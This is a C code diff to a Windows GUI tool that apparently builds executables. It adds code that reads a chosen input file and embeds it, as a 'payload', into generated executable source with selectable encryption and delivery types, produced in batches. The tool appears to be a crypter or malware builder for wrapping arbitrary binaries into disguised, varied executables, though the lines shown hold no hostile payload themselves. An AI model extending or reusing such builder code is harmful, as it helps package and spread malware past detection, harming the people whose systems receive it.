@@ -644,6 +644,10 @@ void browseForFile(HWND hEdit, BOOL isInput) {
 DWORD WINAPI AutoExecutableGenerationThread(LPVOID lpParam) {
     char* outputPath = (char*)lpParam;
     
+    // Get input file path
+    char inputPath[260];
+    GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
+    
     // Get settings
     char batchText[16];
     GetWindowTextA(hBatchCount, batchText, sizeof(batchText));
@@ -660,6 +664,25 @@ DWORD WINAPI AutoExecutableGenerationThread(LPVOID lpParam) {
     EncryptionType encType = (EncryptionType)encIndex;
     DeliveryType delType = (DeliveryType)delIndex;
     
+    // Read input file if provided
+    unsigned char* inputFileData = NULL;
+    DWORD inputFileSize = 0;
+    
+    if (strlen(inputPath) > 0) {
+        FILE* inputFile = fopen(inputPath, "rb");
+        if (inputFile) {
+            fseek(inputFile, 0, SEEK_END);
+            inputFileSize = ftell(inputFile);
+            fseek(inputFile, 0, SEEK_SET);
+            
+            inputFileData = (unsigned char*)malloc(inputFileSize);
+            if (inputFileData) {
+                fread(inputFileData, 1, inputFileSize, inputFile);
+            }
+            fclose(inputFile);
+        }
+    }
+    
     for (int batch = 0; batch < batchCount; batch++) {
         // Update status
         if (batchCount > 1) {
@@ -669,9 +692,9 @@ DWORD WINAPI AutoExecutableGenerationThread(LPVOID lpParam) {
         }
         PostMessage(hMainWindow, WM_USER + 2, MAKEWPARAM(batch, batchCount), 0);
         
-        // Generate production-ready executable source
-        char sourceCode[65536]; // Very large buffer for complex executables
-        generateExecutableSource(sourceCode, sizeof(sourceCode), encType, delType);
+        // Generate production-ready executable source with embedded file
+        char sourceCode[524288]; // Much larger buffer for embedded executables
+        generateExecutableSourceWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputFileData, inputFileSize);
         
         // Create unique temporary filename
         char tempSource[64];
@@ -761,6 +784,11 @@ DWORD WINAPI AutoExecutableGenerationThread(LPVOID lpParam) {
         if (batch < batchCount - 1) {
             Sleep(300);
         }
+    }
+    
+    // Cleanup
+    if (inputFileData) {
+        free(inputFileData);
     }
     
     free(lpParam);
